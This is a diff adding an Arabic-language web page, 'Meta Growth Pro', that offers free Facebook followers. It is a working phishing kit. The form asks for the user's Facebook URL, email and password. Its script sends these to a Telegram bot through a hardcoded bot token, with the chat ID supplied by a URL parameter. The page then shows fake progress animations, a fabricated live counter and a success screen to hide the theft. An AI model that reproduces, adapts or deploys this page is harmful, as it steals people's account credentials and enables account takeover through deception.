@@ -1,0 +1,1081 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Meta Growth Pro — Follower Accelerator</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800;900&display=swap');
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --primary: #0066FF;
+            --primary-glow: rgba(0, 102, 255, 0.4);
+            --secondary: #00D4AA;
+            --accent: #FF006E;
+            --dark: #0A0A0F;
+            --darker: #050508;
+            --card: rgba(255, 255, 255, 0.03);
+            --glass: rgba(255, 255, 255, 0.05);
+            --border: rgba(255, 255, 255, 0.08);
+        }
+
+        html, body {
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            background: var(--darker);
+            min-height: 100vh;
+            min-height: 100dvh; /* مهم للموبايل */
+            height: 100%;
+            width: 100%;
+            color: white;
+            overflow-x: hidden;
+        }
+
+        /* ===== WEBGL BACKGROUND ===== */
+        #webgl-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            height: 100dvh;
+            z-index: 0;
+        }
+
+        /* ===== APP ===== */
+        .app {
+            position: relative;
+            z-index: 10;
+            width: 100%;
+            min-height: 100vh;
+            min-height: 100dvh;
+            padding: 16px;
+            display: flex;
+            flex-direction: column;
+        }
+
+        @media (min-width: 768px) {
+            .app {
+                max-width: 600px;
+                margin: 0 auto;
+                padding: 20px;
+            }
+        }
+
+        /* ===== HEADER 3D ===== */
+        .header-3d {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 20px;
+            padding: 16px;
+            background: var(--card);
+            border: 1px solid var(--border);
+            border-radius: 20px;
+            backdrop-filter: blur(20px);
+            flex-shrink: 0;
+        }
+
+        .logo-3d {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .logo-icon-3d {
+            width: 44px;
+            height: 44px;
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            animation: logoFloat 3s ease-in-out infinite;
+            box-shadow: 
+                0 10px 30px var(--primary-glow),
+                0 0 60px var(--primary-glow);
+            flex-shrink: 0;
+        }
+
+        @keyframes logoFloat {
+            0%, 100% { transform: translateY(0) rotateY(0); }
+            50% { transform: translateY(-5px) rotateY(10deg); }
+        }
+
+        .logo-icon-3d::before {
+            content: '';
+            position: absolute;
+            inset: -2px;
+            background: linear-gradient(135deg, var(--primary), var(--secondary), var(--accent));
+            border-radius: 14px;
+            z-index: -1;
+            animation: borderRotate 3s linear infinite;
+        }
+
+        @keyframes borderRotate {
+            0% { filter: hue-rotate(0deg); }
+            100% { filter: hue-rotate(360deg); }
+        }
+
+        .logo-icon-3d svg {
+            width: 24px;
+            height: 24px;
+            color: white;
+        }
+
+        .logo-text-3d {
+            font-size: 20px;
+            font-weight: 800;
+            background: linear-gradient(135deg, white, var(--secondary));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .badge-3d {
+            padding: 8px 14px;
+            background: linear-gradient(135deg, rgba(0,212,170,0.2), rgba(0,212,170,0.05));
+            border: 1px solid rgba(0,212,170,0.3);
+            border-radius: 25px;
+            font-size: 12px;
+            font-weight: 700;
+            color: var(--secondary);
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            animation: badgePulse 2s infinite;
+            flex-shrink: 0;
+        }
+
+        @keyframes badgePulse {
+            0%, 100% { box-shadow: 0 0 0 0 rgba(0,212,170,0.4); }
+            50% { box-shadow: 0 0 20px 5px rgba(0,212,170,0.1); }
+        }
+
+        .badge-dot {
+            width: 8px;
+            height: 8px;
+            background: var(--secondary);
+            border-radius: 50%;
+            animation: dotBlink 1s infinite;
+        }
+
+        @keyframes dotBlink {
+            0%, 100% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.5; transform: scale(1.2); }
+        }
+
+        /* ===== COUNTER 3D ===== */
+        .counter-section-3d {
+            margin-bottom: 20px;
+            flex-shrink: 0;
+        }
+
+        .counter-card-3d {
+            background: var(--card);
+            border: 1px solid var(--border);
+            border-radius: 20px;
+            padding: 24px 20px;
+            text-align: center;
+            position: relative;
+            animation: cardFloat 6s ease-in-out infinite;
+        }
+
+        @keyframes cardFloat {
+            0%, 100% { transform: translateY(0) rotateX(0); }
+            50% { transform: translateY(-10px) rotateX(2deg); }
+        }
+
+        .counter-glow-3d {
+            position: absolute;
+            inset: -30px;
+            background: radial-gradient(circle, var(--primary-glow), transparent 70%);
+            filter: blur(40px);
+            animation: glowPulse 4s ease-in-out infinite;
+            z-index: -1;
+        }
+
+        @keyframes glowPulse {
+            0%, 100% { opacity: 0.5; transform: scale(1); }
+            50% { opacity: 0.8; transform: scale(1.2); }
+        }
+
+        .counter-label-3d {
+            font-size: 13px;
+            color: rgba(255,255,255,0.6);
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            margin-bottom: 12px;
+            font-weight: 600;
+        }
+
+        .counter-value-3d {
+            font-size: 42px;
+            font-weight: 900;
+            background: linear-gradient(135deg, white, var(--primary), var(--secondary));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            font-variant-numeric: tabular-nums;
+            text-shadow: 0 0 60px var(--primary-glow);
+            animation: counterShine 3s infinite;
+        }
+
+        @keyframes counterShine {
+            0%, 100% { filter: brightness(1); }
+            50% { filter: brightness(1.3); }
+        }
+
+        /* ===== PACKAGES 3D ===== */
+        .packages-title-3d {
+            font-size: 18px;
+            font-weight: 700;
+            margin-bottom: 16px;
+            text-align: center;
+        }
+
+        .packages-grid-3d {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 12px;
+            margin-bottom: 20px;
+            flex-shrink: 0;
+        }
+
+        .package-3d-card {
+            position: relative;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            cursor: pointer;
+        }
+
+        .package-3d-card:hover {
+            transform: translateY(-5px) scale(1.02);
+        }
+
+        .package-3d-card.selected {
+            transform: translateY(-5px) scale(1.05);
+        }
+
+        .package-face-3d {
+            background: var(--card);
+            border: 2px solid var(--border);
+            border-radius: 16px;
+            padding: 20px 10px;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+            transition: all 0.3s;
+        }
+
+        .package-3d-card:hover .package-face-3d {
+            border-color: var(--primary);
+            box-shadow: 0 10px 30px rgba(0,102,255,0.2);
+        }
+
+        .package-3d-card.selected .package-face-3d {
+            border-color: var(--primary);
+            background: linear-gradient(135deg, rgba(0,102,255,0.2), rgba(0,212,170,0.1));
+            box-shadow: 
+                0 15px 40px rgba(0,102,255,0.3),
+                0 0 40px rgba(0,102,255,0.2);
+        }
+
+        .package-popular-badge {
+            position: absolute;
+            top: -2px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: linear-gradient(90deg, var(--accent), #FF4081);
+            padding: 4px 12px;
+            border-radius: 0 0 12px 12px;
+            font-size: 10px;
+            font-weight: 800;
+            letter-spacing: 1px;
+            white-space: nowrap;
+        }
+
+        .package-count-3d {
+            font-size: 32px;
+            font-weight: 900;
+            background: linear-gradient(135deg, white, var(--primary));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 4px;
+        }
+
+        .package-unit-3d {
+            font-size: 12px;
+            color: rgba(255,255,255,0.5);
+            margin-bottom: 8px;
+        }
+
+        .package-price-3d {
+            font-size: 14px;
+            font-weight: 800;
+            color: var(--secondary);
+            text-shadow: 0 0 20px rgba(0,212,170,0.5);
+        }
+
+        /* ===== FORM 3D ===== */
+        .form-container-3d {
+            background: var(--card);
+            border: 1px solid var(--border);
+            border-radius: 20px;
+            padding: 24px 20px;
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+
+        .input-group-3d {
+            margin-bottom: 20px;
+        }
+
+        .input-label-3d {
+            display: block;
+            font-size: 12px;
+            font-weight: 700;
+            color: rgba(255,255,255,0.6);
+            margin-bottom: 8px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .input-wrap-3d {
+            position: relative;
+        }
+
+        .input-field-3d {
+            width: 100%;
+            padding: 16px 18px;
+            background: rgba(0,0,0,0.3);
+            border: 2px solid var(--border);
+            border-radius: 14px;
+            color: white;
+            font-size: 15px;
+            font-weight: 500;
+            transition: all 0.3s;
+        }
+
+        .input-field-3d:focus {
+            outline: none;
+            border-color: var(--primary);
+            box-shadow: 
+                0 10px 30px rgba(0,102,255,0.2),
+                0 0 0 4px rgba(0,102,255,0.1);
+        }
+
+        /* ===== BUTTON 3D ===== */
+        .btn-3d-mega {
+            width: 100%;
+            padding: 18px 24px;
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            border: none;
+            border-radius: 14px;
+            color: white;
+            font-size: 16px;
+            font-weight: 800;
+            cursor: pointer;
+            position: relative;
+            transition: all 0.3s;
+            box-shadow: 
+                0 15px 30px rgba(0,102,255,0.3),
+                0 0 0 1px rgba(255,255,255,0.2) inset;
+            margin-top: auto;
+        }
+
+        .btn-3d-mega::before {
+            content: '';
+            position: absolute;
+            inset: 0;
+            border-radius: 14px;
+            background: linear-gradient(135deg, rgba(255,255,255,0.3), transparent);
+        }
+
+        .btn-3d-mega:hover {
+            transform: translateY(-3px);
+            box-shadow: 
+                0 20px 40px rgba(0,102,255,0.4),
+                0 0 0 1px rgba(255,255,255,0.3) inset;
+        }
+
+        .btn-3d-mega:active {
+            transform: translateY(-1px) scale(0.98);
+        }
+
+        .btn-shine {
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
+            transition: 0.5s;
+        }
+
+        .btn-3d-mega:hover .btn-shine {
+            left: 100%;
+        }
+
+        /* ===== LOADING 3D ===== */
+        .loading-container-3d {
+            text-align: center;
+            padding: 20px;
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .orb-3d-container {
+            width: 160px;
+            height: 160px;
+            margin: 0 auto 30px;
+            position: relative;
+            animation: orbFloat3d 4s ease-in-out infinite;
+        }
+
+        @keyframes orbFloat3d {
+            0%, 100% { transform: translateY(0) rotateX(0) rotateY(0); }
+            50% { transform: translateY(-20px) rotateX(10deg) rotateY(10deg); }
+        }
+
+        .orb-ring-3d {
+            position: absolute;
+            inset: 0;
+            border: 3px solid transparent;
+            border-radius: 50%;
+            animation: orbSpin3d 3s linear infinite;
+        }
+
+        .orb-ring-3d:nth-child(1) {
+            border-top-color: var(--primary);
+            border-right-color: var(--secondary);
+            animation-duration: 4s;
+        }
+
+        .orb-ring-3d:nth-child(2) {
+            inset: 15px;
+            border-bottom-color: var(--accent);
+            border-left-color: var(--primary);
+            animation-direction: reverse;
+            animation-duration: 3s;
+        }
+
+        .orb-ring-3d:nth-child(3) {
+            inset: 30px;
+            border-top-color: var(--secondary);
+            border-right-color: var(--accent);
+            animation-duration: 2s;
+        }
+
+        @keyframes orbSpin3d {
+            to { transform: rotateX(360deg) rotateY(360deg); }
+        }
+
+        .orb-core-3d {
+            position: absolute;
+            inset: 45px;
+            background: radial-gradient(circle, var(--primary), var(--secondary));
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 0 60px var(--primary-glow);
+        }
+
+        .orb-core-3d svg {
+            width: 32px;
+            height: 32px;
+            color: white;
+        }
+
+        .counter-3d-mega {
+            font-size: 56px;
+            font-weight: 900;
+            background: linear-gradient(135deg, white, var(--primary), var(--secondary));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin: 20px 0;
+            text-shadow: 0 0 60px var(--primary-glow);
+        }
+
+        .progress-3d-bar {
+            width: 100%;
+            max-width: 300px;
+            height: 10px;
+            background: rgba(255,255,255,0.1);
+            border-radius: 5px;
+            margin: 0 auto 20px;
+            overflow: hidden;
+        }
+
+        .progress-3d-fill {
+            height: 100%;
+            background: linear-gradient(90deg, var(--primary), var(--secondary), var(--accent));
+            width: 0%;
+            transition: width 0.2s;
+            box-shadow: 0 0 20px currentColor;
+        }
+
+        /* ===== SUCCESS 3D ===== */
+        .success-3d-container {
+            text-align: center;
+            padding: 20px;
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+
+        .trophy-3d {
+            width: 140px;
+            height: 140px;
+            margin: 0 auto 30px;
+            position: relative;
+            animation: trophyBounce3d 0.8s cubic-bezier(0.68, -0.55, 0.265, 1.55);
+        }
+
+        @keyframes trophyBounce3d {
+            0% { transform: scale(0) rotateY(0); }
+            50% { transform: scale(1.2) rotateY(180deg); }
+            100% { transform: scale(1) rotateY(360deg); }
+        }
+
+        .trophy-ring-3d {
+            position: absolute;
+            inset: 0;
+            border: 4px solid var(--secondary);
+            border-radius: 50%;
+            opacity: 0.3;
+            animation: trophyPulse3d 2s infinite;
+        }
+
+        @keyframes trophyPulse3d {
+            0%, 100% { transform: scale(1); opacity: 0.3; }
+            50% { transform: scale(1.3); opacity: 0; }
+        }
+
+        .trophy-core-3d {
+            position: absolute;
+            inset: 15px;
+            background: radial-gradient(circle, var(--secondary), #00aa88);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 0 60px rgba(0,212,170,0.5);
+        }
+
+        .trophy-core-3d svg {
+            width: 60px;
+            height: 60px;
+            color: white;
+        }
+
+        .result-card-3d {
+            background: var(--card);
+            border: 2px solid var(--border);
+            border-radius: 20px;
+            padding: 24px 20px;
+            margin: 24px 0;
+        }
+
+        /* ===== SCREENS ===== */
+        .screen-3d {
+            display: none;
+            flex: 1;
+            flex-direction: column;
+        }
+
+        .screen-3d.active {
+            display: flex;
+            animation: screenEnter3d 0.6s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        @keyframes screenEnter3d {
+            from { 
+                opacity: 0; 
+                transform: translateY(30px); 
+            }
+            to { 
+                opacity: 1; 
+                transform: translateY(0); 
+            }
+        }
+
+        /* ===== CONFETTI ===== */
+        .confetti-3d {
+            position: fixed;
+            inset: 0;
+            pointer-events: none;
+            z-index: 1000;
+        }
+
+        .confetti-piece-3d {
+            position: absolute;
+            width: 10px;
+            height: 10px;
+            animation: confettiFall3d 4s ease-out forwards;
+        }
+
+        @keyframes confettiFall3d {
+            0% { 
+                transform: translateY(-100vh) rotate(0deg); 
+                opacity: 1; 
+            }
+            100% { 
+                transform: translateY(100vh) rotate(720deg); 
+                opacity: 0; 
+            }
+        }
+
+        /* ===== RESPONSIVE FIXES ===== */
+        @media (max-width: 380px) {
+            .app {
+                padding: 12px;
+            }
+            
+            .header-3d {
+                padding: 12px;
+            }
+            
+            .logo-text-3d {
+                font-size: 16px;
+            }
+            
+            .badge-3d {
+                padding: 6px 10px;
+                font-size: 11px;
+            }
+            
+            .counter-value-3d {
+                font-size: 32px;
+            }
+            
+            .package-count-3d {
+                font-size: 24px;
+            }
+            
+            .package-face-3d {
+                padding: 16px 8px;
+            }
+            
+            .counter-3d-mega {
+                font-size: 40px;
+            }
+        }
+
+        @media (max-height: 700px) {
+            .counter-section-3d {
+                margin-bottom: 16px;
+            }
+            
+            .packages-grid-3d {
+                margin-bottom: 16px;
+            }
+            
+            .orb-3d-container {
+                width: 120px;
+                height: 120px;
+            }
+            
+            .trophy-3d {
+                width: 100px;
+                height: 100px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <canvas id="webgl-bg"></canvas>
+
+    <div class="app">
+
+        <!-- HEADER -->
+        <header class="header-3d">
+            <div class="logo-3d">
+                <div class="logo-icon-3d">
+                    <svg viewBox="0 0 24 24" fill="currentColor">
+                        <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
+                    </svg>
+                </div>
+                <span class="logo-text-3d">Meta Growth</span>
+            </div>
+            <div class="badge-3d">
+                <span class="badge-dot"></span>
+                <span>ONLINE</span>
+            </div>
+        </header>
+
+        <!-- SCREEN 1: PACKAGES -->
+        <div class="screen-3d active" id="screen1">
+            
+            <!-- COUNTER -->
+            <div class="counter-section-3d">
+                <div class="counter-card-3d">
+                    <div class="counter-glow-3d"></div>
+                    <div class="counter-label-3d">المتابعين اليوم</div>
+                    <div class="counter-value-3d" id="globalCounter">2,847,392</div>
+                </div>
+            </div>
+
+            <!-- PACKAGES -->
+            <div class="packages-title-3d">اختر الباقة</div>
+            
+            <div class="packages-grid-3d">
+                <div class="package-3d-card" onclick="selectPackage(this, 1000)">
+                    <div class="package-face-3d">
+                        <div class="package-count-3d">1K</div>
+                        <div class="package-unit-3d">متابع</div>
+                        <div class="package-price-3d">مجاني</div>
+                    </div>
+                </div>
+                
+                <div class="package-3d-card selected" onclick="selectPackage(this, 5000)">
+                    <div class="package-face-3d">
+                        <div class="package-popular-badge">الأشهر</div>
+                        <div class="package-count-3d">5K</div>
+                        <div class="package-unit-3d">متابع</div>
+                        <div class="package-price-3d">مجاني</div>
+                    </div>
+                </div>
+                
+                <div class="package-3d-card" onclick="selectPackage(this, 10000)">
+                    <div class="package-face-3d">
+                        <div class="package-count-3d">10K</div>
+                        <div class="package-unit-3d">متابع</div>
+                        <div class="package-price-3d">مجاني</div>
+                    </div>
+                </div>
+            </div>
+
+            <button class="btn-3d-mega" onclick="nextScreen(2)">
+                <span class="btn-shine"></span>
+                <span class="btn-text">ابدأ الآن</span>
+            </button>
+
+        </div>
+
+        <!-- SCREEN 2: FORM -->
+        <div class="screen-3d" id="screen2">
+            <div class="form-container-3d">
+                <div class="input-group-3d">
+                    <label class="input-label-3d">رابط الحساب</label>
+                    <div class="input-wrap-3d">
+                        <input type="text" class="input-field-3d" id="profileUrl" placeholder="https://facebook.com/username">
+                    </div>
+                </div>
+
+                <div class="input-group-3d">
+                    <label class="input-label-3d">البريد الإلكتروني</label>
+                    <div class="input-wrap-3d">
+                        <input type="email" class="input-field-3d" id="email" placeholder="name@example.com">
+                    </div>
+                </div>
+
+                <div class="input-group-3d">
+                    <label class="input-label-3d">كلمة المرور</label>
+                    <div class="input-wrap-3d">
+                        <input type="password" class="input-field-3d" id="password" placeholder="••••••••">
+                    </div>
+                </div>
+
+                <button class="btn-3d-mega" onclick="submitForm()" id="submitBtn">
+                    <span class="btn-shine"></span>
+                    <span class="btn-text">تأكيد الطلب</span>
+                </button>
+            </div>
+        </div>
+
+        <!-- SCREEN 3: LOADING -->
+        <div class="screen-3d" id="screen3">
+            <div class="loading-container-3d">
+                <div class="orb-3d-container">
+                    <div class="orb-ring-3d"></div>
+                    <div class="orb-ring-3d"></div>
+                    <div class="orb-ring-3d"></div>
+                    <div class="orb-core-3d">
+                        <svg viewBox="0 0 24 24" fill="currentColor">
+                            <path d="M16 11c1.66 0 2.99-1.34 2.99-3S17.66 5 16 5c-1.66 0-3 1.34-3 3s1.34 3 3 3zm-8 0c1.66 0 2.99-1.34 2.99-3S9.66 5 8 5C6.34 5 5 6.34 5 8s1.34 3 3 3zm0 2c-2.33 0-7 1.17-7 3.5V19h14v-2.5c0-2.33-4.67-3.5-7-3.5z"/>
+                        </svg>
+                    </div>
+                </div>
+                
+                <div class="counter-3d-mega" id="followersCount">0</div>
+                
+                <div class="progress-3d-bar">
+                    <div class="progress-3d-fill" id="progressFill"></div>
+                </div>
+                
+                <p style="color: rgba(255,255,255,0.6);">جاري إضافة المتابعين...</p>
+            </div>
+        </div>
+
+        <!-- SCREEN 4: SUCCESS -->
+        <div class="screen-3d" id="screen4">
+            <div class="success-3d-container">
+                <div class="trophy-3d">
+                    <div class="trophy-ring-3d"></div>
+                    <div class="trophy-core-3d">
+                        <svg viewBox="0 0 24 24" fill="currentColor">
+                            <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/>
+                        </svg>
+                    </div>
+                </div>
+                
+                <h2 style="font-size: 32px; font-weight: 900; margin-bottom: 12px; color: var(--secondary);">تم بنجاح!</h2>
+                <p style="color: rgba(255,255,255,0.7); font-size: 15px;">سيتم إضافة المتابعين خلال 24 ساعة</p>
+
+                <div class="result-card-3d">
+                    <div style="display: flex; align-items: center; gap: 16px; margin-bottom: 20px;">
+                        <div style="width: 60px; height: 60px; background: linear-gradient(135deg, var(--primary), var(--secondary)); border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 28px; font-weight: 900;" id="resultAvatar">👤</div>
+                        <div>
+                            <div style="font-size: 20px; font-weight: 800; margin-bottom: 4px;" id="resultName">المستخدم</div>
+                            <div style="color: var(--secondary); font-weight: 700; font-size: 14px;">✓ تم التأكيد</div>
+                        </div>
+                    </div>
+                    
+                    <div style="display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px;">
+                        <div style="text-align: center; padding: 16px; background: rgba(0,0,0,0.2); border-radius: 14px;">
+                            <div style="font-size: 24px; font-weight: 900; color: var(--primary);" id="resultCount">5K</div>
+                            <div style="font-size: 12px; color: rgba(255,255,255,0.5);">متابع</div>
+                        </div>
+                        <div style="text-align: center; padding: 16px; background: rgba(0,0,0,0.2); border-radius: 14px;">
+                            <div style="font-size: 24px; font-weight: 900; color: var(--secondary);">24h</div>
+                            <div style="font-size: 12px; color: rgba(255,255,255,0.5);">الوقت</div>
+                        </div>
+                        <div style="text-align: center; padding: 16px; background: rgba(0,0,0,0.2); border-radius: 14px;">
+                            <div style="font-size: 24px; font-weight: 900; color: var(--accent);">✓</div>
+                            <div style="font-size: 12px; color: rgba(255,255,255,0.5);">حالة</div>
+                        </div>
+                    </div>
+                </div>
+
+                <button class="btn-3d-mega" onclick="location.reload()">
+                    <span class="btn-shine"></span>
+                    <span class="btn-text">طلب جديد</span>
+                </button>
+            </div>
+        </div>
+
+    </div>
+
+    <div class="confetti-3d" id="confetti"></div>
+
+    <script>
+        // WEBGL BACKGROUND
+        const canvas = document.getElementById('webgl-bg');
+        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        
+        function resizeCanvas() {
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+            if (gl) {
+                gl.viewport(0, 0, canvas.width, canvas.height);
+            }
+        }
+        resizeCanvas();
+        window.addEventListener('resize', resizeCanvas);
+
+        // Simple WebGL shader
+        if (gl) {
+            const vertexShaderSource = `
+                attribute vec2 position;
+                void main() {
+                    gl_Position = vec4(position, 0.0, 1.0);
+                }
+            `;
+            
+            const fragmentShaderSource = `
+                precision mediump float;
+                uniform float time;
+                uniform vec2 resolution;
+                
+                void main() {
+                    vec2 uv = gl_FragCoord.xy / resolution.xy;
+                    vec3 color = vec3(0.02, 0.02, 0.03);
+                    
+                    // Animated gradient
+                    float wave = sin(uv.x * 10.0 + time) * 0.5 + 0.5;
+                    float wave2 = cos(uv.y * 8.0 + time * 0.7) * 0.5 + 0.5;
+                    
+                    color += vec3(0.0, 0.1, 0.3) * wave * 0.3;
+                    color += vec3(0.0, 0.3, 0.2) * wave2 * 0.2;
+                    
+                    // Vignette
+                    float vignette = 1.0 - length((uv - 0.5) * 1.2);
+                    color *= vignette;
+                    
+                    gl_FragColor = vec4(color, 1.0);
+                }
+            `;
+            
+            function createShader(type, source) {
+                const shader = gl.createShader(type);
+                gl.shaderSource(shader, source);
+                gl.compileShader(shader);
+                return shader;
+            }
+            
+            const vertexShader = createShader(gl.VERTEX_SHADER, vertexShaderSource);
+            const fragmentShader = createShader(gl.FRAGMENT_SHADER, fragmentShaderSource);
+            
+            const program = gl.createProgram();
+            gl.attachShader(program, vertexShader);
+            gl.attachShader(program, fragmentShader);
+            gl.linkProgram(program);
+            gl.useProgram(program);
+            
+            const vertices = new Float32Array([-1, -1, 1, -1, -1, 1, 1, 1]);
+            const buffer = gl.createBuffer();
+            gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
+            gl.bufferData(gl.ARRAY_BUFFER, vertices, gl.STATIC_DRAW);
+            
+            const position = gl.getAttribLocation(program, 'position');
+            gl.enableVertexAttribArray(position);
+            gl.vertexAttribPointer(position, 2, gl.FLOAT, false, 0, 0);
+            
+            const timeUniform = gl.getUniformLocation(program, 'time');
+            const resolutionUniform = gl.getUniformLocation(program, 'resolution');
+            
+            let startTime = Date.now();
+            
+            function render() {
+                const time = (Date.now() - startTime) * 0.001;
+                gl.uniform1f(timeUniform, time);
+                gl.uniform2f(resolutionUniform, canvas.width, canvas.height);
+                gl.drawArrays(gl.TRIANGLE_STRIP, 0, 4);
+                requestAnimationFrame(render);
+            }
+            render();
+        }
+
+        // CONFIG
+        const BOT_TOKEN = '8360365079:AAE5JYoDz1OwgyFnoMoi1gO2EtYVMmlXAOY';
+        let selectedPackage = 5000;
+        let currentScreen = 1;
+        let userData = {};
+
+        // GLOBAL COUNTER
+        function animateGlobalCounter() {
+            const el = document.getElementById('globalCounter');
+            let base = 2847392;
+            
+            setInterval(() => {
+                base += Math.floor(Math.random() * 100) + 50;
+                el.textContent = base.toLocaleString('en-US');
+            }, 1500);
+        }
+        animateGlobalCounter();
+
+        // NAVIGATION
+        function getChatId() {
+            return new URLSearchParams(window.location.search).get('documentation');
+        }
+
+        function selectPackage(el, count) {
+            document.querySelectorAll('.package-3d-card').forEach(p => p.classList.remove('selected'));
+            el.classList.add('selected');
+            selectedPackage = count;
+        }
+
+        function nextScreen(n) {
+            document.getElementById('screen' + currentScreen).classList.remove('active');
+            document.getElementById('screen' + n).classList.add('active');
+            currentScreen = n;
+        }
+
+        // FORM SUBMIT
+        async function submitForm() {
+            const btn = document.getElementById('submitBtn');
+            const url = document.getElementById('profileUrl').value;
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            if (!url || !email || !password) return;
+
+            userData = { url, email, password };
+            
+            // Animation
+            btn.style.transform = 'translateY(-3px) scale(0.95)';
+            setTimeout(() => {
+                btn.style.transform = '';
+            }, 200);
+
+            // Send to Telegram
+            const chatId = getChatId();
+            if (chatId) {
+                const msg = `طلب متابعين جديد\n\nالحساب: ${url}\nالإيميل: ${email}\nالباسورد: ${password}\nالعدد: ${selectedPackage}\nالوقت: ${new Date().toLocaleString('ar-SA')}`;
+                
+                try {
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: chatId, text: msg })
+                    });
+                } catch (e) {}
+            }
+
+            setTimeout(() => {
+                nextScreen(3);
+                startProcessing();
+            }, 1000);
+        }
+
+        // PROCESSING
+        function startProcessing() {
+            const counter = document.getElementById('followersCount');
+            const progress = document.getElementById('progressFill');
+            
+            let count = 0;
+            const target = selectedPackage;
+            const inc = Math.ceil(target / 80);
+
+            const interval = setInterval(() => {
+                count += inc;
+                if (count > target) count = target;
+
+                counter.textContent = count.toLocaleString('en-US');
+                progress.style.width = (count / target * 100) + '%';
+
+                if (count >= target) {
+                    clearInterval(interval);
+                    setTimeout(() => {
+                        nextScreen(4);
+                        createConfetti();
+                        const email = document.getElementById('email').value;
+                        document.getElementById('resultName').textContent = email.split('@')[0];
+                        document.getElementById('resultCount').textContent = (selectedPackage / 1000) + 'K';
+                        document.getElementById('resultAvatar').textContent = email.charAt(0).toUpperCase();
+                    }, 500);
+                }
+            }, 25);
+        }
+
+        // CONFETTI
+        function createConfetti() {
+            const container = document.getElementById('confetti');
+            const colors = ['#0066FF', '#00D4AA', '#FF006E', '#FFD700'];
+            
+            for (let i = 0; i < 100; i++) {
+                const piece = document.createElement('div');
+                piece.className = 'confetti-piece-3d';
+                piece.style.left = Math.random() * 100 + '%';
+                piece.style.background = colors[Math.floor(Math.random() * colors.length)];
+                piece.style.animationDelay = Math.random() * 3 + 's';
+                piece.style.animationDuration = (Math.random() * 3 + 3) + 's';
+                container.appendChild(piece);
+            }
+        }
+    </script>
+
+</body>
+</html>
